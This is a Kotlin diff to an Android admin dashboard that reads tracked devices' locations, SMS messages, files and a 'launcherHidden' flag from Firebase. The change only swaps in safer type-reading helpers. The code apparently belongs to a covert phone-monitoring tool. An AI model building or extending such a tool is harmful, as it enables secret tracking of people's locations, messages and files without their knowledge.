@@ -173,9 +173,9 @@ class AdminDashboardActivity : ComponentActivity() {
                                             } catch (e: Exception) {
                                                 encryptedLat.toDoubleOrNull() ?: 0.0
                                             }
-                                        } ?: locationSnapshot.child("lat").getValue(Double::class.java) ?: 0.0
+                                        } ?: SafeFirebaseReader.getDouble(locationSnapshot, "lat")
                                     } catch (e: Exception) {
-                                        locationSnapshot.child("lat").getValue(Double::class.java) ?: 0.0
+                                        SafeFirebaseReader.getDouble(locationSnapshot, "lat")
                                     }
                                     
                                     val lng = try {
@@ -190,21 +190,21 @@ class AdminDashboardActivity : ComponentActivity() {
                                             } catch (e: Exception) {
                                                 encryptedLng.toDoubleOrNull() ?: 0.0
                                             }
-                                        } ?: locationSnapshot.child("lng").getValue(Double::class.java) ?: 0.0
+                                        } ?: SafeFirebaseReader.getDouble(locationSnapshot, "lng")
                                     } catch (e: Exception) {
-                                        locationSnapshot.child("lng").getValue(Double::class.java) ?: 0.0
+                                        SafeFirebaseReader.getDouble(locationSnapshot, "lng")
                                     }
                                     
-                                    val battery = locationSnapshot.child("battery").getValue(Int::class.java) ?: 0
-                                    val timestamp = locationSnapshot.child("timestamp").getValue(Long::class.java) ?: 0L
-                                    val accuracy = locationSnapshot.child("accuracy").getValue(Double::class.java) ?: 0.0
+                                    val battery = SafeFirebaseReader.getInt(locationSnapshot, "battery")
+                                    val timestamp = SafeFirebaseReader.getLong(locationSnapshot, "timestamp")
+                                    val accuracy = SafeFirebaseReader.getDouble(locationSnapshot, "accuracy")
                                     val provider = locationSnapshot.child("provider").getValue(String::class.java) ?: ""
-                                    val launcherHidden = locationSnapshot.child("launcherHidden").getValue(Boolean::class.java) ?: false
+                                    val launcherHidden = SafeFirebaseReader.getBoolean(locationSnapshot, "launcherHidden")
                                     
                                     // Read from status/
                                     val statusSnapshot = child.child("status")
-                                    val isOnline = statusSnapshot.child("online").getValue(Boolean::class.java) ?: false
-                                    val lastSeen = statusSnapshot.child("lastSeen").getValue(Long::class.java) ?: 0L
+                                    val isOnline = SafeFirebaseReader.getBoolean(statusSnapshot, "online")
+                                    val lastSeen = SafeFirebaseReader.getLong(statusSnapshot, "lastSeen")
                                     
                                     // Read from root level (device info)
                                     val deviceId = child.child("deviceId").getValue(String::class.java) ?: ""
@@ -214,8 +214,8 @@ class AdminDashboardActivity : ComponentActivity() {
                                     
                                     // Read from trackingConfig/
                                     val trackingSnapshot = child.child("trackingConfig")
-                                    val trackingEnabled = trackingSnapshot.child("trackingEnabled").getValue(Boolean::class.java) ?: false
-                                    val intervalSeconds = trackingSnapshot.child("intervalSeconds").getValue(Int::class.java) ?: 14
+                                    val trackingEnabled = SafeFirebaseReader.getBoolean(trackingSnapshot, "trackingEnabled")
+                                    val intervalSeconds = SafeFirebaseReader.getInt(trackingSnapshot, "intervalSeconds")
                                     
                                     // Create device object
                                     val device = DeviceData(
@@ -1028,7 +1028,7 @@ class AdminDashboardActivity : ComponentActivity() {
                         val conversationKey = convSnapshot.key ?: return@forEach
                         val rawPhoneNumber = convSnapshot.child("phoneNumber").getValue(String::class.java) ?: ""
                         val lastMessage = convSnapshot.child("lastMessage").getValue(String::class.java) ?: ""
-                        val lastTimestamp = convSnapshot.child("lastTimestamp").getValue(Long::class.java) ?: 0L
+                        val lastTimestamp = SafeFirebaseReader.getLong(convSnapshot, "lastTimestamp")
 
                         val phoneNumber = if (aesKey != null && rawPhoneNumber.contains(".")) {
                             CryptoManager.decrypt(rawPhoneNumber, aesKey) ?: rawPhoneNumber
@@ -1068,8 +1068,8 @@ class AdminDashboardActivity : ComponentActivity() {
                     try {
                         val messageKey = msgSnapshot.key ?: return@forEach
                         val rawBody = msgSnapshot.child("body").getValue(String::class.java) ?: ""
-                        val date = msgSnapshot.child("date").getValue(Long::class.java) ?: 0L
-                        val type = msgSnapshot.child("type").getValue(Int::class.java) ?: 1
+                        val date = SafeFirebaseReader.getLong(msgSnapshot, "date")
+                        val type = SafeFirebaseReader.getInt(msgSnapshot, "type")
                         val id = msgSnapshot.child("id").getValue(String::class.java) ?: ""
 
                         val body = if (aesKey != null && rawBody.contains(".")) {
@@ -1329,9 +1329,9 @@ class AdminDashboardActivity : ComponentActivity() {
                             val id = child.child("id").getValue(String::class.java) ?: ""
                             val rawName = child.child("name").getValue(String::class.java) ?: ""
                             val rawPath = child.child("path").getValue(String::class.java) ?: ""
-                            val size = child.child("size").getValue(Long::class.java) ?: 0L
+                            val size = SafeFirebaseReader.getLong(child, "size")
                             val mimeType = child.child("mimeType").getValue(String::class.java) ?: ""
-                            val dateModified = child.child("dateModified").getValue(Long::class.java) ?: 0L
+                            val dateModified = SafeFirebaseReader.getLong(child, "dateModified")
                             val storagePath = child.child("storagePath").getValue(String::class.java) ?: ""
 
                             val name = if (aesKey != null) {
